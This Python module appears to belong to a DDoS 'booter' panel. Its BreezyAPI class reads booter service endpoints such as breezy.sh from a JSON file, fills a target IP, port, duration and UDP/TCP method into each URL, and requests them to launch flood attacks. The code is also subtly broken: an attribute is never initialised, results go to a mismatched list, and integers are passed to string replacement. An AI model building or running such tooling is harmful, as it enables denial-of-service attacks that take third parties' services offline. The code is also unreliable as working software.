import requests

from ..classes import Attack

class API_M():
    name:       str; # Breezy API
    max_time:   int; # 1200
    url:        str; # "https://breezy.sh/api?key=gay&host=[HOST]&port=[PORT]&time=[TIME]&method=[METHOD]"
    methods:    list; # ['UDP', 'TCP']

class BreezyAPI():
    apis:   list[API_M];
    def __init__(self, api_m: dict):
        self.__parseMethods(api_m);

    def __parseMethods(self, methods: dict) -> bool:
        try:
            for m in methods:
                n = API_M();
                n.name = methods[m]['name'];
                n.max_time = methods[m]['max_time'];
                n.url = methods[m]['url'];
                n.methods = methods[m]['methods'];
                self.apis.append(n);
        except:
            print("[ X ] Error, Something went wrong parsing the API JSON file....!");
            return False;

        return True;

    def Send_API_Attack(self, ip: str, p: int, t: int, m: int) -> bool:
        self.host = ip; self.port = p; self.time = t; self.method = m;

        ## self.__verifyInputs(); is needed here for security!

        check_apis = self.__parseAttack();
        if check_apis == False:
            print("[ X ] Error, This method was not found in any of the API in the json file....!");
            return False;

        for api in check_apis:
            resp = requests.get(api);
            if resp.status_code != 200:
                print("[ X ] Error, This API is either offline or unable to reach....!");
                continue;

        return True;

    def __parseAttack(self) -> list[str] | bool:
        matched_apis = []

        for api in self.apis:
            if self.method in api.methods:
                self.matched_apis.append(api.url.replace("[HOST]", self.host).replace("[PORT]", self.port).replace("[TIME]", self.time).replace("[METHOD]", self.method));
        
        if len(matched_apis) > 0: return matched_apis;
        return False;
